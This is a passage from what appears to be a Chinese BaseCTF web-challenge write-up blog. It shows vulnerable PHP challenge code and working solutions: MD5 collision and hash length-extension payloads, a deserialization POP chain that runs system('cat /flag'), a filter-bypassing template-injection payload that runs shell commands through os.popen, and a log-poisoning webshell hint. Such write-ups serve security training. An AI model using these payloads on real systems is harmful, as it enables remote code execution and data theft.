&amp;&amp; md5((string)$apple) == md5((string)$banana))) &#123;</span><br><span class="line">    die(&#x27;难吗?不难!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你还是绕过去了?</span><br><span class="line">// 哦哦哦, 我少了一个等于号</span><br><span class="line">$apple = (string)$_POST[&#x27;apppple&#x27;];</span><br><span class="line">$banana = (string)$_POST[&#x27;banananana&#x27;];</span><br><span class="line">if (!((string)$apple !== (string)$banana &amp;&amp; md5((string)$apple) === md5((string)$banana))) &#123;</span><br><span class="line">    die(&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你以为这就结束了</span><br><span class="line">if (!isset($_SESSION[&#x27;random&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;random&#x27;] = bin2hex(random_bytes(16)) . bin2hex(random_bytes(16)) . bin2hex(random_bytes(16));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 你想看到 random 的值吗?</span><br><span class="line">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span><br><span class="line">$random = $_SESSION[&#x27;random&#x27;];</span><br><span class="line">echo md5($random);</span><br><span class="line">echo &#x27;&lt;br /&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$name = $_POST[&#x27;name&#x27;] ?? &#x27;user&#x27;;</span><br><span class="line"></span><br><span class="line">// check if name ends with &#x27;admin&#x27;</span><br><span class="line">if (substr($name, -5) !== &#x27;admin&#x27;) &#123;</span><br><span class="line">    die(&#x27;不是管理员也来凑热闹?&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$md5 = $_POST[&#x27;md5&#x27;];</span><br><span class="line">if (md5($random . $name) !== $md5) &#123;</span><br><span class="line">    die(&#x27;伪造? NO NO NO!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 认输了, 看样子你真的很懂 MD5</span><br><span class="line">// 那 flag 就给你吧</span><br><span class="line">echo &quot;看样子你真的很懂 MD5&quot;;</span><br><span class="line">echo file_get_contents(&#x27;/flag&#x27;); 加强难度就不会了?</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apple%5B%5D=1&amp;banana%5B%5D=2&amp;appple=QNKCDZO&amp;bananana=240610708&amp;apppple=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&amp;banananana=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak&amp;name=%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%03%00%00%00%00%00%00admin&amp;md5=bf06e69ad2479becab3c61e8b268403c</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251010191244067.png" alt="image-20251010191244067"></p><h4 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP"></a>Really EZ POP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;echo 123;&#x27;;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Shark says:&#x27; . $this-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $sea_ani = $this-&gt;animal;</span><br><span class="line">        echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_POST[&#x27;nature&#x27;]) &#123;</span><br><span class="line">    $nature = unserialize($_POST[&#x27;nature&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251202205505747.png" alt="image-20251202205505747"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;system(&quot;cat /flag&quot;);&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line"></span><br><span class="line">    public function setWord($word)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;word = $word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$nature=new Nature();</span><br><span class="line">$sea=new Sea();</span><br><span class="line">$shark=new Shark();</span><br><span class="line">$sink=new Sink();</span><br><span class="line"></span><br><span class="line">$nature-&gt;sea=$sea;</span><br><span class="line">$sea-&gt;animal=$shark;</span><br><span class="line">$shark-&gt;setword($sink);</span><br><span class="line">echo urlencode(serialize($nature));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="数学大师"><a href="#数学大师" class="headerlink" title="数学大师"></a>数学大师</h4><p>直接跑脚本就好了，贴个官p</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">url = &quot;http://challenge.imxbt.cn:31149/&quot;</span><br><span class="line"></span><br><span class="line">answer = 0</span><br><span class="line">max_attempts = 100  # 防止无限循环</span><br><span class="line">attempt = 0</span><br><span class="line"></span><br><span class="line">while attempt &lt; max_attempts:</span><br><span class="line">    attempt += 1</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        # 发送当前答案</span><br><span class="line">        response = req.post(url, data=&#123;&quot;answer&quot;: str(answer)&#125;, timeout=5)</span><br><span class="line">        response_text = response.text</span><br><span class="line">        </span><br><span class="line">        print(f&quot;Attempt &#123;attempt&#125;:&quot;)</span><br><span class="line">        print(response_text)</span><br><span class="line">        </span><br><span class="line">        # 检查是否成功</span><br><span class="line">        if &quot;BaseCTF&quot; in response_text:</span><br><span class="line">            print(&quot;Flag found!&quot;)</span><br><span class="line">            print(response_text)</span><br><span class="line">            break</span><br><span class="line">            </span><br><span class="line">        # 提取数学表达式</span><br><span class="line">        regex = r&quot;(\d+)\s*([+×÷-])\s*(\d+)\s*\?&quot;</span><br><span class="line">        match = re.search(regex, response_text)</span><br><span class="line">        </span><br><span class="line">        if not match:</span><br><span class="line">            print(&quot;No math expression found!&quot;)</span><br><span class="line">            break</span><br><span class="line">            </span><br><span class="line">        num1 = int(match.group(1))</span><br><span class="line">        operator = match.group(2)</span><br><span class="line">        num2 = int(match.group(3))</span><br><span class="line">        </span><br><span class="line">        # 计算答案</span><br><span class="line">        if operator == &quot;+&quot;:</span><br><span class="line">            answer = num1 + num2</span><br><span class="line">        elif operator == &quot;-&quot;:</span><br><span class="line">            answer = num1 - num2</span><br><span class="line">        elif operator == &quot;×&quot;:</span><br><span class="line">            answer = num1 * num2</span><br><span class="line">        elif operator == &quot;÷&quot;:</span><br><span class="line">            answer = num1 // num2</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;Unknown operator: &#123;operator&#125;&quot;)</span><br><span class="line">            break</span><br><span class="line">            </span><br><span class="line">        print(f&quot;Calculated: &#123;num1&#125; &#123;operator&#125; &#123;num2&#125; = &#123;answer&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;Error occurred: &#123;str(e)&#125;&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">if attempt &gt;= max_attempts:</span><br><span class="line">    print(&quot;Reached maximum attempts without finding the flag.&quot;)</span><br></pre></td></tr></table></figure><h3 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h3><h4 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">经典的SSTI,过滤了⼀些关键字和⼀些符号</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BaseCTF&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cl&#x27;&#x27;ass_&#x27;&#x27;_&#x27;])%&#125;</span><br><span class="line">BaseCTF&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cl&#x27;&#x27;ass_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;] ())%&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 将查找到的父类列表替换到data中</span><br><span class="line">data = r&#x27;&#x27;&#x27;</span><br><span class="line">    </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"># 在这里添加可以利用的类，下面会介绍这些类的利用方法</span><br><span class="line">userful_class = [&#x27;linecache&#x27;, &#x27;os._wrap_close&#x27;, &#x27;subprocess.Popen&#x27;, &#x27;warnings.catch_warnings&#x27;, &#x27;_frozen_importlib._ModuleLock&#x27;, &#x27;_frozen_importlib._DummyModuleLock&#x27;, &#x27;_frozen_importlib._ModuleLockManager&#x27;, &#x27;_frozen_importlib.ModuleSpec&#x27;]</span><br><span class="line"></span><br><span class="line">pattern = re.compile(r&quot;&#x27;(.*?)&#x27;&quot;)</span><br><span class="line">class_list = re.findall(pattern, data)</span><br><span class="line">for c in class_list:</span><br><span class="line">    for i in userful_class:</span><br><span class="line">        if i in c:</span><br><span class="line">            print(str(class_list.index(c)) + &quot;: &quot; + c)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">100: _frozen_importlib._ModuleLock</span><br><span class="line">101: _frozen_importlib._DummyModuleLock</span><br><span class="line">102: _frozen_importlib._ModuleLockManager</span><br><span class="line">102: _frozen_importlib._ModuleLockManager</span><br><span class="line">103: _frozen_importlib.ModuleSpec</span><br><span class="line">137: os._wrap_close</span><br><span class="line">240: warnings.catch_warnings</span><br><span class="line">367: subprocess.Popen</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">环境变量绕过/</span><br><span class="line">BaseCTF&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cl&#x27;&#x27;ass_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()[137][&#x27;_&#x27;&#x27;_in&#x27;&#x27;it_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;env&#x27;)[&#x27;rea&#x27;&#x27;d&#x27;]())%&#125;</span><br><span class="line"></span><br><span class="line">OLDPWD=/</span><br><span class="line">BaseCTF&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cl&#x27;&#x27;ass_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()[137][&#x27;_&#x27;&#x27;_in&#x27;&#x27;it_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;cd $OLDPWD;cat</span><br><span class="line">flag&#x27;)[&#x27;rea&#x27;&#x27;d&#x27;]())%&#125;</span><br></pre></td></tr></table></figure><h4 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$incompetent = $_POST[&#x27;incompetent&#x27;];</span><br><span class="line">$Datch = $_POST[&#x27;Datch&#x27;];</span><br><span class="line"></span><br><span class="line">if ($incompetent !== &#x27;HelloWorld&#x27;) &#123;</span><br><span class="line">    die(&#x27;写出程序员的第一行问候吧！&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//这是个什么东东？？？</span><br><span class="line">$required_chars = [&#x27;s&#x27;, &#x27;e&#x27;, &#x27;v&#x27;, &#x27;a&#x27;, &#x27;n&#x27;, &#x27;x&#x27;, &#x27;r&#x27;, &#x27;o&#x27;];</span><br><span class="line">$is_valid = true;</span><br><span class="line"></span><br><span class="line">foreach ($required_chars as $char) &#123;</span><br><span class="line">    if (strpos($Datch, $char) === false) &#123;</span><br><span class="line">        $is_valid = false;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($is_valid) &#123;</span><br><span class="line"></span><br><span class="line">    $invalid_patterns = [&#x27;php://&#x27;, &#x27;http://&#x27;, &#x27;https://&#x27;, &#x27;ftp://&#x27;, &#x27;file://&#x27; , &#x27;data://&#x27;, &#x27;gopher://&#x27;];</span><br><span class="line"></span><br><span class="line">    foreach ($invalid_patterns as $pattern) &#123;</span><br><span class="line">        if (stripos($Datch, $pattern) !== false) &#123;</span><br><span class="line">            die(&#x27;此路不通换条路试试?&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    include($Datch);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&#x27;文件名不合规 请重试&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">写出程序员的第一行问候吧！</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文件包含日志文件，ua头写马</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251202231353120.png" alt="image-20251202231353120"></p><h4 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">if (sizeof($_POST[&#x27;len&#x27;]) == sizeof($array)) &#123;</span><br><span class="line">  ys_open($_GET[&#x27;tip&#x27;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  die(&quot;错了！就你还想玩原神？❌❌❌&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function ys_open($tip) &#123;</span><br><span class="line">  if ($tip != &quot;我要玩原神&quot;) &#123;</span><br><span class="line">    die(&quot;我不管，我要玩原神！😭😭😭&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  dumpFlag();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function dumpFlag() &#123;</span><br><span class="line">  if (!isset($_POST[&#x27;m&#x27;]) || sizeof($_POST[&#x27;m&#x27;]) != 2) &#123;</span><br><span class="line">    die(&quot;可恶的QQ人！😡😡😡&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = $_POST[&#x27;m&#x27;][0];</span><br><span class="line">  $b = $_POST[&#x27;m&#x27;][1];</span><br><span class="line">  if(empty($a) || empty($b) || $a != &quot;100%&quot; || $b != &quot;love100%&quot; . md5($a)) &#123;</span><br><span class="line">    die(&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  include &#x27;flag.php&#x27;;</span><br><span class="line">  $flag[] = array();</span><br><span class="line">  for ($ii = 0;$ii &lt; sizeof($array);$ii++) &#123;</span><br><span class="line">    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  echo json_encode($flag);</span><br><span class="line">&#125; 错了！就你还想玩原神？❌❌❌</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://challenge.imxbt.cn:31692/&quot;</span><br><span class="line">data=&#123;&#125;</span><br><span class="line">for i in range(0,100):</span><br><span class="line">    key = &quot;len[&quot; + str(i) + &quot;]&quot;  # 创建键</span><br><span class="line">    data[key] = i</span><br><span class="line">    resp=requests.post(url=url,data=data)</span><br><span class="line">    if &quot;&lt;/code&gt;我不管，我要玩原神！😭😭😭&quot; in resp.text:</span><br><span class="line">        print(resp.text)</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://challenge.imxbt.cn:31692/?tip=我要玩原神&quot;</span><br><span class="line">data=&#123;&#125;</span><br><span class="line">for i in range(0,100):</span><br><span class="line">    key = &quot;len[&quot; + str(i) + &quot;]&quot;  # 创建键</span><br><span class="line">    data[key] = i</span><br><span class="line">    # if &quot;&lt;/code&gt;我不管，我要玩原神！😭😭😭&quot; in resp.text:</span><br><span class="line">    #     resp = requests.post(url=url, data=data)</span><br><span class="line">    #     print(resp.text)</span><br><span class="line">    #     print(i)</span><br><span class="line">    #     break</span><br><span class="line">    if i==44:</span><br><span class="line">        data[&quot;m[0]&quot;]=&quot;100%&quot;</span><br><span class="line">        data[&quot;m[1]&quot;]=&quot;love100%30bd7ce7de206924302499f197c7a966&quot;</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        print(resp.text)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$challenge_url = &quot;http://challenge.imxbt.cn:31692/?&quot;;</span><br><span class="line">$post = &quot;&quot;;</span><br><span class="line">for ($i = 0;$i &lt; 45;$i++) &#123;</span><br><span class="line">    $post .= &quot;len[]=&quot; . $i . &quot;&amp;&quot;;</span><br><span class="line">&#125; // $_POST[&#x27;len&#x27;] == sizeof($array)</span><br><span class="line">$get = &quot;tip=&quot; . urlencode(&quot;我要玩原神&quot;); // $tip != &quot;我要玩原神&quot;</span><br><span class="line">$post .= &quot;m[]=&quot; . urlencode(&quot;100%&quot;) . &quot;&amp;m[]=&quot; . urlencode(&quot;love100%&quot; . md5(&quot;100%&quot;));</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27; . &#x27;URL: &#x27; . $challenge_url . $get . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">echo &#x27;POST Data: &#x27; . $post . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">$curl = curl_init();</span><br><span class="line"></span><br><span class="line">// 修正数组语法 - 使用 array() 而不是 []</span><br><span class="line">curl_setopt_array($curl, array(</span><br><span class="line">    CURLOPT_URL =&gt; $challenge_url . $get,</span><br><span class="line">    CURLOPT_RETURNTRANSFER =&gt; true,</span><br><span class="line">    CURLOPT_ENCODING =&gt; &#x27;&#x27;,</span><br><span class="line">    CURLOPT_MAXREDIRS =&gt; 10,</span><br><span class="line">    CURLOPT_TIMEOUT =&gt; 30,</span><br><span class="line">    CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">    CURLOPT_CUSTOMREQUEST =&gt; &#x27;POST&#x27;,</span><br><span class="line">    CURLOPT_POSTFIELDS =&gt; $post,</span><br><span class="line">    CURLOPT_HTTPHEADER =&gt; array(</span><br><span class="line">        &#x27;Content-Type: application/x-www-form-urlencoded&#x27;,</span><br><span class="line">    ),</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$response = curl_exec($curl);</span><br><span class="line">$err = curl_error($curl);</span><br><span class="line"></span><br><span class="line">curl_close($curl);</span><br><span class="line"></span><br><span class="line">if ($err) die(&#x27;cURL Error #:&#x27; . $err);</span><br><span class="line">preg_match(&#x27;/\[\&quot;(.*?)\&quot;\]/&#x27;, $response, $matches);</span><br><span class="line"></span><br><span class="line">if (empty($matches)) die(&quot;Invalid JSON&quot;);</span><br><span class="line">$json = &#x27;[&quot;&#x27; . $matches[1] . &#x27;&quot;]&#x27;;</span><br><span class="line">echo &quot;MD5 Array: &quot; . $json . &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">$md5_array = json_decode($json, true);</span><br><span class="line">$flag = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">for ($ii = 0; $ii &lt; count($md5_array); $ii++) &#123;</span><br><span class="line">    for ($ascii = 0; $ascii &lt; 256; $ascii++) &#123;</span><br><span class="line">        if (md5($ascii ^ $ii) === $md5_array[$ii]) &#123;</span><br><span class="line">            $flag .= 